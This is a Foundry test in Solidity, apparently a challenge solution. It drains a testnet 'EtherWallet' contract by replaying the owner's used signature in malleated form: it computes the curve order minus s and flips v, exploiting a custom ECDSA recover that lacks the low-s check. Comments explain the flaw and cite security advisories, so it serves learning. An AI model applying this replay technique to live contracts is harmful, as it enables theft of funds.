// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "forge-std/console.sol";
import "./utils/BaseTest.sol";
import "../src/EtherWallet.sol";

contract EtherWalletTest is BaseTest {
    EtherWallet private level;

    constructor() {
        string[] memory userLabels = new string[](1);
        userLabels[0] = "Player";
        preSetUp(1, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        // Attach the contract to the addresses on the fork
        level = EtherWallet(payable(0x4b90946aB87BF6e1CA1F26b2af2897445F48f877));
        // level = new Switch();
        vm.label(address(level), "EtherWallet");

        assertEq(address(level).balance, 0.2 ether);
    }

    function testCompleteLevel() public {
        address player = users[0];
        vm.startPrank(player);

        uint256 playerBalanceBefore = player.balance;
        uint256 walletBalanceBefore = address(level).balance;

        // The goal of this challenge is to be able to withdraw all the ETH in the wallet contract
        // If we look at the transaction history for the contract https://goerli.etherscan.io/address/0x4b90946ab87bf6e1ca1f26b2af2897445f48f877
        // We see that the Contract has been created and funded with 0.01 ETH
        // Then the owner called `withdraw` "burning" the only signature available to to withrdraw
        // After withdrawing (to burn the signature) they transferred back 0.2 ETH
        // At this point the Contract (wallet) has 0.2 ETH in its balance
        // The contract has only two functions: `transferOwnership` and `withdraw`
        // The only way to withdraw the funds is by calling `withdraw` but the owner seems to have already used the only signature known (by looking at the tx)
        // If you look at the code we cannot use that signature anymore because at the very beginning there's the check `require(!usedSignatures[signature], "Signature already used!");`
        // And after using the signature the contract lock it via `usedSignatures[signature] = true;`
        // Another check we see is that `ECDSA.recover` returned value is equal to the owner. This is needed to know that the signer who generated the signature
        // Is the same one that own the contract. If that's true it means that the owner has generated the signature and is allowing the user
        // to withdraw the funds
        // The second option to withdraw the funds would be to find a way to call `transferOwnership`, change the owner, generate a new signature
        // and at that point we would be able to withdraw but as far as I can see there's no way to be able to transfer the ownership

        // What we can do is to look at `ECDSA.recover` and see if there's a way to exploit it
        // If you look closer the contract is not using the standard implementation from OpenZeppelin but rather a custom one
        // If we compare those two implementation we see that this custom one is missing a very important check done by the OpenZeppelin one
        //
        //  if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {
        //     return (address(0), RecoverError.InvalidSignatureS);
        // }
        // Why is this check is needed? It's needed to prevent signature malleability! This mean that given a signature you are able to
        // slightly modify the value of `v` and `s` to generate an "inverted signature" that would be different but at the same time
        // still valid. If you want to know more go ahead and read all the content I've listed below

        // Further reading:
        // - EIP-191: Signed Data Standard: https://eips.ethereum.org/EIPS/eip-191
        // - OpenZeppelin ECDSA implementation: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol
        // - OpenZeppelin ECDSA signature malleability report: https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-4h98-2769-gh6h
        // - SWC-117 Signature Malleability: https://swcregistry.io/docs/SWC-117
        // - Inherent Malleability of ECDSA Signatures: https://www.derpturkey.com/inherent-malleability-of-ecdsa-signatures/
        // - Bitcoin Transaction Malleability: https://eklitzke.org/bitcoin-transaction-malleability
        // - B002: Solidity EC Signature Pitfalls: https://0xsomeone.medium.com/b002-solidity-ec-signature-pitfalls-b24a0f91aef4
        // - OpenZeppelin PR for Signature Malleability: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/1622
        // - ECDSA signature malleability example in solidity: https://github.com/0xbok/malleable-signature-demo

        // Let's look at the `withdraw` transaction to gather the signature used by the owner of the contract
        // https://goerli.etherscan.io/tx/0x8ccffd2e4bbef4815ee6be1355d1545831257a12aae203bcff711a28bb8d3548
        bytes
            memory signature = hex"53e2bbed453425461021f7fa980d928ed1cb0047ad0b0b99551706e426313f293ba5b06947c91fc3738a7e63159b43148ecc8f8070b37869b95e96261fc9657d1c";

        // If we try to withdraw using the same signature the contract should revert
        vm.expectRevert(bytes("Signature already used!"));
        level.withdraw(signature);

        // Now we need to exploit the malleable signature exploit present in the custom ECDSA
        // Implementation inside the EtherWallet contract
        // Let's split the current signature to get back the tuple (uint8 v, bytes32 r, bytes32 s)
        (uint8 v, bytes32 r, bytes32 s) = deconstructSignature(signature);

        // Now we can calculate what should be the "inverted signature"
        bytes32 groupOrder = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        bytes32 invertedS = bytes32(uint256(groupOrder) - uint256(s));
        uint8 invertedV = v == 27 ? 28 : 27;

        // After calculating which is the inverse `s` and `v` we just need to re-create the signature
        bytes memory invertedSignature = abi.encodePacked(r, invertedS, invertedV);

        // And use it to trigger again the withdraw
        // If everything works as expected we should have drained the contract from the 0.2 ETH in its balance
        level.withdraw(invertedSignature);

        vm.stopPrank();

        // Assert we were able to withdraw all the ETH
        assertEq(player.balance, playerBalanceBefore + walletBalanceBefore);
        assertEq(address(level).balance, 0 ether);
    }

    function deconstructSignature(bytes memory signature)
        public
        pure
        returns (
            uint8,
            bytes32,
            bytes32
        )
    {
        bytes32 r;
        bytes32 s;
        uint8 v;
        // ecrecover takes the signature parameters, and the only way to get them
        // currently is to use assembly.
        /// @solidity memory-safe-assembly
        assembly {
            r := mload(add(signature, 0x20))
            s := mload(add(signature, 0x40))
            v := byte(0, mload(add(signature, 0x60)))
        }
        return (v, r, s);
    }
}
